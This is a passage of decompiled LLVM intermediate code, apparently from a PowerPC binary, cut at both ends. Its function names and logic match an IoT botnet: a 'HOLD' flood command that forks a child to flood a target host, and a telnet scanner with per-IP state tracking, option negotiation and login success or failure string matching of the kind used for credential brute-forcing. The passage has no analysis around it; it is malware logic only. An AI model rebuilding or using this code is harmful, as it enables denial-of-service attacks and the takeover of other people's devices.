dec_label_pc_1000c82c:                            ; preds = %dec_label_pc_1000c814.loopexit, %dec_label_pc_1000c2e0, %entry
  %v0_1000c854 = phi i32 [ %v4_1000c2cc, %entry ], [ %v1_1000c81813, %dec_label_pc_1000c2e0 ], [ %v1_1000c818, %dec_label_pc_1000c814.loopexit ]
  ret i32 %v0_1000c854

; uselistorder directives
  uselistorder i32 %v1_1000c7fc, { 1, 0 }
  uselistorder i32 %v1_1000c6ec, { 1, 0 }
  uselistorder i32 %storemerge57, { 1, 0 }
  uselistorder i8* %v2_1000c394, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000c390, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge311, { 2, 0, 1 }
  uselistorder i32 %v2_1000c4d0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_1000c36c, { 1, 0 }
  uselistorder i32 %v2_1000c2bc, { 1, 0 }
  uselistorder i32 %v1_1000c2a8, { 1, 0 }
  uselistorder i32 %v3_1000c290, { 1, 0, 2 }
  uselistorder i32 %v1_1000c290, { 1, 0 }
  uselistorder i32 %v0_1000c288, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 1, 0 }
  uselistorder i32 268486684, { 1, 0 }
  uselistorder label %dec_label_pc_1000c804.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c814.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f8, { 8, 2, 5, 1, 6, 7, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c4e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c494, { 1, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = icmp slt i32 %arg3, 3
  br i1 %tmp11, label %dec_label_pc_1000c8b0, label %dec_label_pc_1000c890

dec_label_pc_1000c890:                            ; preds = %entry
  %v1_1000c894 = add i32 %arg4, 12
  %v1_1000c898 = inttoptr i32 %v1_1000c894 to i32*
  %v2_1000c898 = load i32, i32* %v1_1000c898, align 4
  store i32 268486820, i32* @lr, align 4
  %v1_1000c8a0 = call i32 @atol(i32 %v2_1000c898)
  %tmp12 = icmp sgt i32 %v1_1000c8a0, -1
  br i1 %tmp12, label %dec_label_pc_1000c8cc, label %dec_label_pc_1000c8b0

dec_label_pc_1000c8b0:                            ; preds = %dec_label_pc_1000c890, %entry
  %v6_1000c8c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002bbf0.492 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000c968

dec_label_pc_1000c8cc:                            ; preds = %dec_label_pc_1000c890
  %v1_1000c8d0 = call i32 @mfork(i32 %arg2)
  %v3_1000c8d8 = icmp eq i32 %v1_1000c8d0, 0
  br i1 %v3_1000c8d8, label %dec_label_pc_1000c8e0, label %dec_label_pc_1000c968

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c8cc
  %v1_1000c8e4 = add i32 %arg4, 4
  %v1_1000c8e8 = inttoptr i32 %v1_1000c8e4 to i32*
  %v2_1000c8e8 = load i32, i32* %v1_1000c8e8, align 4
  %v1_1000c8f0 = add i32 %arg4, 8
  %v1_1000c8f4 = inttoptr i32 %v1_1000c8f0 to i32*
  %v7_1000c914 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002bc14.494 to i32), i32 %arg2, i32 %v2_1000c8e8)
  %v2_1000c930 = load i32, i32* %v1_1000c8f4, align 4
  store i32 268486972, i32* @lr, align 4
  %v1_1000c938 = call i32 @atol(i32 %v2_1000c930)
  store i32 %v1_1000c938, i32* @r29, align 4
  %v2_1000c948 = load i32, i32* %v1_1000c898, align 4
  store i32 268486996, i32* @lr, align 4
  %v1_1000c950 = call i32 @atol(i32 %v2_1000c948)
  %v0_1000c958 = load i32, i32* @r28, align 4
  %v0_1000c95c = load i32, i32* @r29, align 4
  %v3_1000c964 = call i32 @sendHOLD(i32 %v0_1000c958, i32 %v0_1000c95c, i32 %v1_1000c950)
  br label %dec_label_pc_1000c968

dec_label_pc_1000c968:                            ; preds = %dec_label_pc_1000c8cc, %dec_label_pc_1000c8b0, %dec_label_pc_1000c8e0
  %v0_1000c984 = phi i32 [ %v1_1000c8d0, %dec_label_pc_1000c8cc ], [ %v6_1000c8c4, %dec_label_pc_1000c8b0 ], [ %v3_1000c964, %dec_label_pc_1000c8e0 ]
  ret i32 %v0_1000c984

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c968, { 2, 0, 1 }
}

define i32 @get_ipstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_1000c9a4 = add i32 %arg1, 4
  %v2_1000c9a4 = inttoptr i32 %v1_1000c9a4 to i32*
  %v3_1000c9a4 = load i32, i32* %v2_1000c9a4, align 4
  store i32 %v3_1000c9a4, i32* %stack_var_-20, align 4
  store i32 268487104, i32* @lr, align 4
  %v3_1000c9bc = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_1000c9bc
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 268487196, i32* @lr, align 4
  %v0_1000ca18 = call i32 @__GI_memset()
  %v5_1000ca30 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_1000ca40 = load i8, i8* %arg3, align 1
  %v3_1000ca48 = icmp eq i8 %v3_1000ca40, -1
  br i1 %v3_1000ca48, label %dec_label_pc_1000ca50, label %dec_label_pc_1000ca64

dec_label_pc_1000ca50:                            ; preds = %entry
  store i32 268487268, i32* @lr, align 4
  %v6_1000ca60 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_1000ca64

dec_label_pc_1000ca64:                            ; preds = %entry, %dec_label_pc_1000ca50
  %v3_1000ca70 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_1000ca78 = icmp ne i32 %v3_1000ca70, 0
  %. = zext i1 %v3_1000ca78 to i32
  ret i32 %.

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca64, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_1000cae8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000cae8, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge

dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge: ; preds = %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge.dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge_crit_edge, %entry
  %v3_1000cb00.pre = phi i32 [ %v2_1000cae8, %entry ], [ %v3_1000cb00.pre.pre, %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge.dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge_crit_edge ]
  %v1_1000cb1821 = phi i32 [ 1, %entry ], [ %v1_1000cb18, %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge.dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge_crit_edge ]
  %v1_1000cb04 = mul nuw nsw i32 %v1_1000cb1821, 4
  %v2_1000cb08 = add i32 %v1_1000cb04, %v3_1000cb00.pre
  %v2_1000cb10 = inttoptr i32 %v2_1000cb08 to i32*
  store i32 0, i32* %v2_1000cb10, align 4
  %v1_1000cb18 = add nuw nsw i32 %v1_1000cb1821, 1
  %tmp19 = icmp ult i32 %v1_1000cb18, 32
  br i1 %tmp19, label %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge.dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge_crit_edge, label %dec_label_pc_1000cb2c

dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge.dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge
  %v3_1000cb00.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge

dec_label_pc_1000cb2c:                            ; preds = %dec_label_pc_1000cafc.dec_label_pc_1000cafc_crit_edge
  %v1_1000cb30 = udiv i32 %arg1, 32
  %v1_1000cb38 = mul nuw nsw i32 %v1_1000cb30, 4
  %v2_1000cb3c = ptrtoint i32* %stack_var_-184 to i32
  %v2_1000cb40 = add nuw nsw i32 %v1_1000cb38, 8
  %v1_1000cb44 = add i32 %v2_1000cb40, %v2_1000cb3c
  %v1_1000cb48 = inttoptr i32 %v1_1000cb44 to i32*
  %v2_1000cb48 = load i32, i32* %v1_1000cb48, align 4
  %v1_1000cb50 = urem i32 %arg1, 32
  %v3_1000cb58 = shl i32 1, %v1_1000cb50
  %v2_1000cb5c = or i32 %v2_1000cb48, %v3_1000cb58
  store i32 %v2_1000cb5c, i32* %v1_1000cb48, align 4
  %v1_1000cb78 = add i32 %arg1, 1
  %v2_1000cb80 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268487580, i32* @lr, align 4
  %v5_1000cb98 = call i32 @__libc_select(i32 %v1_1000cb78, i32 %v2_1000cae8, i32 0, i32 0, i32 %v2_1000cb80)
  %v2_1000cba0 = icmp sgt i32 %v5_1000cb98, 0
  br i1 %v2_1000cba0, label %dec_label_pc_1000cbb4, label %dec_label_pc_1000cbd4

dec_label_pc_1000cbb4:                            ; preds = %dec_label_pc_1000cb2c
  store i32 268487628, i32* @lr, align 4
  %v4_1000cbc8 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_1000cbd4

dec_label_pc_1000cbd4:                            ; preds = %dec_label_pc_1000cb2c, %dec_label_pc_1000cbb4
  %storemerge = phi i32 [ %v4_1000cbc8, %dec_label_pc_1000cbb4 ], [ 0, %dec_label_pc_1000cb2c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1000cb18, { 1, 0 }
  uselistorder i32 %v2_1000cae8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1000cbd4, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000cc14 = icmp eq i32 %arg2, 0
  br i1 %v3_1000cc14, label %dec_label_pc_1000cc1c, label %dec_label_pc_1000cc2c

dec_label_pc_1000cc1c:                            ; preds = %entry
  %v2_1000cc20 = load i32, i32* %arg1, align 4
  store i32 268487724, i32* @lr, align 4
  %v1_1000cc28 = call i32 @close(i32 %v2_1000cc20)
  br label %dec_label_pc_1000cc2c

dec_label_pc_1000cc2c:                            ; preds = %entry, %dec_label_pc_1000cc1c
  %v2_1000cc34 = add i32 %tmp, 16
  %v3_1000cc34 = inttoptr i32 %v2_1000cc34 to i32*
  store i32 0, i32* %v3_1000cc34, align 4
  %v1_1000cc44 = trunc i32 %arg2 to i8
  %v3_1000cc44 = add i32 %tmp, 8
  %v4_1000cc44 = inttoptr i32 %v3_1000cc44 to i8*
  store i8 %v1_1000cc44, i8* %v4_1000cc44, align 1
  %v1_1000cc4c = add i32 %tmp, 28
  %v2_1000cc4c = inttoptr i32 %v1_1000cc4c to i32*
  %v3_1000cc4c = load i32, i32* %v2_1000cc4c, align 4
  store i32 %v3_1000cc4c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268487776, i32* @lr, align 4
  %v0_1000cc5c = call i32 @__GI_memset()
  ret i32 %v0_1000cc5c

; uselistorder directives
  uselistorder label %dec_label_pc_1000cc2c, { 1, 0 }
}

define i32 @reset_ipstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000cc98 = inttoptr i32 %arg1 to i32*
  %v3_1000cc98 = call i32 @advance_state(i32* %v2_1000cc98, i32 0)
  %v3_1000cca4 = add i32 %arg1, 9
  %v4_1000cca4 = inttoptr i32 %v3_1000cca4 to i8*
  store i8 1, i8* %v4_1000cca4, align 1
  ret i32 %v3_1000cc98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000cce8 = call i32 @contains_string(i32 %arg1, i32 268699384)
  ret i32 %v2_1000cce8
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000cd34 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([8 x i8*]* @global_var_100406b4.508 to i32))
  ret i32 %v3_1000cd34

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268488056, i32* @lr, align 4
  %v1_1000cd74 = call i32 @contains_success(i32 %arg1)
  %v3_1000cd7c = icmp eq i32 %v1_1000cd74, 0
  br i1 %v3_1000cd7c, label %dec_label_pc_1000cd84, label %dec_label_pc_1000cdac

dec_label_pc_1000cd84:                            ; preds = %entry
  store i32 268488076, i32* @lr, align 4
  %v1_1000cd88 = call i32 @contains_fail(i32 %arg1)
  %v3_1000cd90 = icmp ne i32 %v1_1000cd88, 0
  %. = zext i1 %v3_1000cd90 to i32
  br label %dec_label_pc_1000cdac

dec_label_pc_1000cdac:                            ; preds = %dec_label_pc_1000cd84, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_1000cd84 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000ce00

dec_label_pc_1000ce00:                            ; preds = %dec_label_pc_1000ce00, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_1000ce04, %dec_label_pc_1000ce00 ]
  %v1_1000ce04 = add i32 %stack_var_-36.0, 1
  %v1_1000ce10 = mul i32 %v1_1000ce04, 4
  %v2_1000ce1c = add i32 %v1_1000ce10, %arg2
  %v1_1000ce20 = inttoptr i32 %v2_1000ce1c to i32*
  %v2_1000ce20 = load i32, i32* %v1_1000ce20, align 4
  %v3_1000ce24 = icmp eq i32 %v2_1000ce20, 0
  br i1 %v3_1000ce24, label %dec_label_pc_1000ce84.preheader, label %dec_label_pc_1000ce00

dec_label_pc_1000ce84.preheader:                  ; preds = %dec_label_pc_1000ce00
  %v2_1000ce8c4 = icmp sgt i32 %v1_1000ce04, 0
  br i1 %v2_1000ce8c4, label %dec_label_pc_1000ce38.lr.ph, label %dec_label_pc_1000ce9c

dec_label_pc_1000ce38.lr.ph:                      ; preds = %dec_label_pc_1000ce84.preheader
  %v3_1000ce5c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_1000ce38

dec_label_pc_1000ce38:                            ; preds = %dec_label_pc_1000ce38.lr.ph, %dec_label_pc_1000ce78
  %storemerge27 = phi i32 [ 0, %dec_label_pc_1000ce38.lr.ph ], [ %v1_1000ce7c, %dec_label_pc_1000ce78 ]
  %v1_1000ce3c = mul i32 %storemerge27, 4
  %v2_1000ce48 = add i32 %v1_1000ce3c, %arg2
  %v1_1000ce4c = inttoptr i32 %v2_1000ce48 to i32*
  %v2_1000ce4c = load i32, i32* %v1_1000ce4c, align 4
  store i32 268488288, i32* @lr, align 4
  %v4_1000ce5c = call i32 @strcasestr(i8* %v3_1000ce5c, i32 %v2_1000ce4c, i32 %v2_1000ce48)
  %v3_1000ce64 = icmp eq i32 %v4_1000ce5c, 0
  br i1 %v3_1000ce64, label %dec_label_pc_1000ce78, label %dec_label_pc_1000ce9c.loopexit

dec_label_pc_1000ce78:                            ; preds = %dec_label_pc_1000ce38
  %v1_1000ce7c = add nuw nsw i32 %storemerge27, 1
  %v2_1000ce8c = icmp slt i32 %v1_1000ce7c, %v1_1000ce04
  br i1 %v2_1000ce8c, label %dec_label_pc_1000ce38, label %dec_label_pc_1000ce9c.loopexit

dec_label_pc_1000ce9c.loopexit:                   ; preds = %dec_label_pc_1000ce78, %dec_label_pc_1000ce38
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_1000ce38 ], [ 0, %dec_label_pc_1000ce78 ]
  br label %dec_label_pc_1000ce9c

dec_label_pc_1000ce9c:                            ; preds = %dec_label_pc_1000ce9c.loopexit, %dec_label_pc_1000ce84.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_1000ce84.preheader ], [ %storemerge.ph, %dec_label_pc_1000ce9c.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_1000ce04, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ce38, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268488436, i32* @lr, align 4
  %v3_1000cef0 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_1000cf00 = or i32 %v3_1000cef0, 2048
  store i32 ptrtoint (i32* @global_var_1000cf1c.509 to i32), i32* @lr, align 4
  %v3_1000cf18 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_1000cf00)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_1000cf28 = urem i32 %arg3, 65536
  store i32 %v1_1000cf28, i32* @r3, align 4
  %v1_1000cf30 = call i32 @htons(i32 %v1_1000cf28)
  %v2_1000cf40 = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000cf50 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_1000cf40)
  %v3_1000cf58 = icmp eq i32 %v4_1000cf50, 0
  br i1 %v3_1000cf58, label %dec_label_pc_1000cf6c, label %dec_label_pc_1000cf60

dec_label_pc_1000cf60:                            ; preds = %entry
  br label %dec_label_pc_1000d12c

dec_label_pc_1000cf6c:                            ; preds = %entry
  %v2_1000cf70 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_1000cf70, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268488580, i32* @lr, align 4
  %v0_1000cf80 = call i32 @__GI_memset()
  store i32 268488600, i32* @lr, align 4
  %v3_1000cf94 = call i32 @connect(i32 %arg1, i32 %v2_1000cf40, i32 16)
  %tmp25 = icmp sgt i32 %v3_1000cf94, -1
  br i1 %tmp25, label %dec_label_pc_1000d0e8, label %dec_label_pc_1000cfac

dec_label_pc_1000cfac:                            ; preds = %dec_label_pc_1000cf6c
  %v0_1000cfac = call i32 @__errno_location()
  %v1_1000cfb4 = inttoptr i32 %v0_1000cfac to i32*
  %v2_1000cfb4 = load i32, i32* %v1_1000cfb4, align 4
  %v3_1000cfb8 = icmp eq i32 %v2_1000cfb4, 115
  br i1 %v3_1000cfb8, label %dec_label_pc_1000cfc0, label %dec_label_pc_1000d0dc

dec_label_pc_1000cfc0:                            ; preds = %dec_label_pc_1000cfac
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_1000cfd0 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_1000cfd0, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge

dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge: ; preds = %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge.dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge_crit_edge, %dec_label_pc_1000cfc0
  %v3_1000cfe8.pre = phi i32 [ %v2_1000cfd0, %dec_label_pc_1000cfc0 ], [ %v3_1000cfe8.pre.pre, %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge.dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge_crit_edge ]
  %v1_1000d00029 = phi i32 [ 1, %dec_label_pc_1000cfc0 ], [ %v1_1000d000, %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge.dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge_crit_edge ]
  %v1_1000cfec = mul nuw nsw i32 %v1_1000d00029, 4
  %v2_1000cff0 = add i32 %v1_1000cfec, %v3_1000cfe8.pre
  %v2_1000cff8 = inttoptr i32 %v2_1000cff0 to i32*
  store i32 0, i32* %v2_1000cff8, align 4
  %v1_1000d000 = add nuw nsw i32 %v1_1000d00029, 1
  %tmp26 = icmp ult i32 %v1_1000d000, 32
  br i1 %tmp26, label %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge.dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge_crit_edge, label %dec_label_pc_1000d014

dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge.dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge
  %v3_1000cfe8.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge

dec_label_pc_1000d014:                            ; preds = %dec_label_pc_1000cfe4.dec_label_pc_1000cfe4_crit_edge
  %v1_1000d018 = udiv i32 %arg1, 32
  %v1_1000d020 = mul nuw nsw i32 %v1_1000d018, 4
  %v2_1000d024 = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000d028 = add nuw nsw i32 %v1_1000d020, 32
  %v1_1000d02c = add i32 %v2_1000d028, %v2_1000d024
  %v1_1000d030 = inttoptr i32 %v1_1000d02c to i32*
  %v2_1000d030 = load i32, i32* %v1_1000d030, align 4
  %v1_1000d038 = urem i32 %arg1, 32
  %v3_1000d040 = shl i32 1, %v1_1000d038
  %v2_1000d044 = or i32 %v2_1000d030, %v3_1000d040
  store i32 %v2_1000d044, i32* %v1_1000d030, align 4
  %v1_1000d060 = add i32 %arg1, 1
  %v2_1000d068 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268488836, i32* @lr, align 4
  %v5_1000d080 = call i32 @__libc_select(i32 %v1_1000d060, i32 0, i32 %v2_1000cfd0, i32 0, i32 %v2_1000d068)
  %tmp27 = icmp slt i32 %v5_1000d080, 1
  br i1 %tmp27, label %dec_label_pc_1000d0d0, label %dec_label_pc_1000d090

dec_label_pc_1000d090:                            ; preds = %dec_label_pc_1000d014
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000d098 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1000d09c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268488888, i32* @lr, align 4
  %v5_1000d0b4 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000d098, i32 %v2_1000d09c)
  %v3_1000d0b8 = load i32, i32* %stack_var_-44, align 4
  %v3_1000d0bc = icmp eq i32 %v3_1000d0b8, 0
  br i1 %v3_1000d0bc, label %dec_label_pc_1000d0e8, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d090
  br label %dec_label_pc_1000d12c

dec_label_pc_1000d0d0:                            ; preds = %dec_label_pc_1000d014
  br label %dec_label_pc_1000d12c

dec_label_pc_1000d0dc:                            ; preds = %dec_label_pc_1000cfac
  br label %dec_label_pc_1000d12c

dec_label_pc_1000d0e8:                            ; preds = %dec_label_pc_1000d090, %dec_label_pc_1000cf6c
  store i32 268488956, i32* @lr, align 4
  %v3_1000d0f8 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_1000d108 = call i32 @__asm_rlwinm(i32 %v3_1000d0f8, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_1000d124.510 to i32), i32* @lr, align 4
  %v3_1000d120 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_1000d108)
  br label %dec_label_pc_1000d12c

dec_label_pc_1000d12c:                            ; preds = %dec_label_pc_1000d0dc, %dec_label_pc_1000d0d0, %dec_label_pc_1000d0c4, %dec_label_pc_1000cf60, %dec_label_pc_1000d0e8
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000d0e8 ], [ 0, %dec_label_pc_1000d0d0 ], [ 0, %dec_label_pc_1000d0c4 ], [ 0, %dec_label_pc_1000d0dc ], [ 0, %dec_label_pc_1000cf60 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_1000d000, { 1, 0 }
  uselistorder i32 %v2_1000cfd0, { 1, 0, 2 }
  uselistorder i32 %v2_1000cf40, { 1, 0 }
  uselistorder i32 %v1_1000cf28, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @getHost, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000d12c, { 4, 0, 1, 2, 3 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_1000d170 = add i32 %arg2, 1
  %v1_1000d174 = inttoptr i32 %v1_1000d170 to i8*
  %v2_1000d174 = load i8, i8* %v1_1000d174, align 1
  %v1_1000d184 = icmp ult i8 %v2_1000d174, -5
  br i1 %v1_1000d184, label %dec_label_pc_1000d2dc, label %dec_label_pc_1000d18c

dec_label_pc_1000d18c:                            ; preds = %entry
  %v2_1000d190 = icmp eq i8 %v2_1000d174, -1
  br i1 %v2_1000d190, label %dec_label_pc_1000d198, label %dec_label_pc_1000d1b4

dec_label_pc_1000d198:                            ; preds = %dec_label_pc_1000d18c
  br label %dec_label_pc_1000d2dc

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d18c
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_1000d1c0 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268489172, i32* @lr, align 4
  %v4_1000d1d0 = call i32 @send(i32 %arg1, i32 %v2_1000d1c0, i32 1, i32 16384)
  %v2_1000d1dc = load i8, i8* %v1_1000d174, align 1
  %v3_1000d1e4 = icmp eq i8 %v2_1000d1dc, -4
  br i1 %v3_1000d1e4, label %dec_label_pc_1000d1ec, label %dec_label_pc_1000d1f8

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1b4
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d2a0

dec_label_pc_1000d1f8:                            ; preds = %dec_label_pc_1000d1b4
  %v2_1000d200 = load i8, i8* %v1_1000d174, align 1
  %v3_1000d208 = icmp eq i8 %v2_1000d200, -2
  br i1 %v3_1000d208, label %dec_label_pc_1000d210, label %dec_label_pc_1000d21c

dec_label_pc_1000d210:                            ; preds = %dec_label_pc_1000d1f8
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d2a0

dec_label_pc_1000d21c:                            ; preds = %dec_label_pc_1000d1f8
  %v2_1000d224 = load i8, i8* %v1_1000d174, align 1
  %v3_1000d22c = icmp eq i8 %v2_1000d224, 3
  br i1 %v3_1000d22c, label %dec_label_pc_1000d234, label %dec_label_pc_1000d26c

dec_label_pc_1000d234:                            ; preds = %dec_label_pc_1000d21c
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d2a0

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d21c
  %v3_1000d244 = icmp eq i8 %v2_1000d224, -3
  %.7 = select i1 %v3_1000d244, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d2a0

dec_label_pc_1000d2a0:                            ; preds = %dec_label_pc_1000d234, %dec_label_pc_1000d210, %dec_label_pc_1000d1ec, %dec_label_pc_1000d26c
  store i32 268489400, i32* @lr, align 4
  %v4_1000d2b4 = call i32 @send(i32 %arg1, i32 %v2_1000d1c0, i32 1, i32 16384)
  %v1_1000d2bc = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_1000d2d4.511 to i32), i32* @lr, align 4
  %v4_1000d2d0 = call i32 @send(i32 %arg1, i32 %v1_1000d2bc, i32 1, i32 16384)
  br label %dec_label_pc_1000d2dc

dec_label_pc_1000d2dc:                            ; preds = %dec_label_pc_1000d198, %dec_label_pc_1000d2a0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
